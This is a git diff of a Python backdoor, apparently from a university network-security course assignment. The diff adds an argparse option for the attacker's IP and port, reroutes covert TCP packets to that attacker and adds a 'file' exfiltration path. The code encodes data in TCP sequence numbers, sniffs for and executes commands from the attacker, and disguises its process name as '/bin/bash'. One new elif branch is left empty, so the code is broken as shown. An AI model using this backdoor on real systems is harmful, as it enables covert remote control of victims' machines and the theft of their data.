@@ -13,15 +13,24 @@ from file_monitoring import *
 from portknocking import *
 import _thread
 import setproctitle
+import argparse
 
 """
 dnf install python3-pip
 Setup: pip3 install pycryptodome setproctitle scapy watchdog3
 """
+# parse command line argument
+arg_parser = argparse.ArgumentParser(
+    prog='Backdoor',
+    description='COMP 8505 Final Assignment by Peyman Tehrani Parsa & Khang Tran'
+)
+arg_parser.add_argument('-p', dest='port', type = int, help = 'attackers PORT', default=9999, const=9999, nargs='?')
+arg_parser.add_argument('-i', dest='ip', type = str, help = 'attackers IP')
+args = arg_parser.parse_args()
 
 TTL = 234
 TTLKEY = 222
-victim = ("192.168.0.7", 9999)
+attacker = (args.ip, args.port)
 messages = []
 setFlag = "E"
 
@@ -39,9 +48,16 @@ def secret_send(msg: str, type: str = 'command'):
         msg = message_to_bits(msg)
         chunks = message_spliter(msg)
         packets = packatizer(chunks)
-        knockOpen()
         send(packets, verbose=True)
-        knockClose()
+        send(IP(dst=attacker[0], ttl=TTL)/TCP(sport=myip[1], dport=attacker[1], flags="U"))
+    if(type == "file"):
+        #raed the file
+        #store it
+        msg = message_to_bits(msg)
+        chunks = message_spliter(msg)
+        packets = packatizer(chunks)
+        send(packets, verbose=True)
+        send(IP(dst=attacker[0], ttl=TTL)/TCP(sport=myip[1], dport=attacker[1], flags="P"))
 
 
 def packatizer(msg):
@@ -70,8 +86,6 @@ def packatizer(msg):
             # i.e. 1/3 messages to send.
             packets.append(craft(msg[counter]))
             counter = counter + 1
-    packets.append(IP(dst=victim[0], ttl=TTL) /
-                   TCP(sport=myip[1], dport=victim[1], flags="U"))
     return packets
 
 
@@ -88,7 +102,7 @@ def craft(data: str) -> IP:
     global TTL
     global setFlag
     # The payload contains the unique password, UID, position number and total.
-    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1], dport=victim[1],
+    packet = IP(dst=attacker[0], ttl=TTL)/TCP(sport=myip[1], dport=attacker[1],
                                             seq=int(str(data), 2), flags=setFlag)
     return packet
 
@@ -133,10 +147,12 @@ def commandResult(packet):
             payload = ''.join(messages)
             execPayload(payload)
             messages = []
+        elif flag == 0x08:
+
 
 
 def commandSniffer():
-    sniff(filter="tcp and host "+victim[0], prn=commandResult)
+    sniff(filter="tcp and host "+attacker[0], prn=commandResult)
 
 
 setproctitle.setproctitle("/bin/bash")  # set fake process name
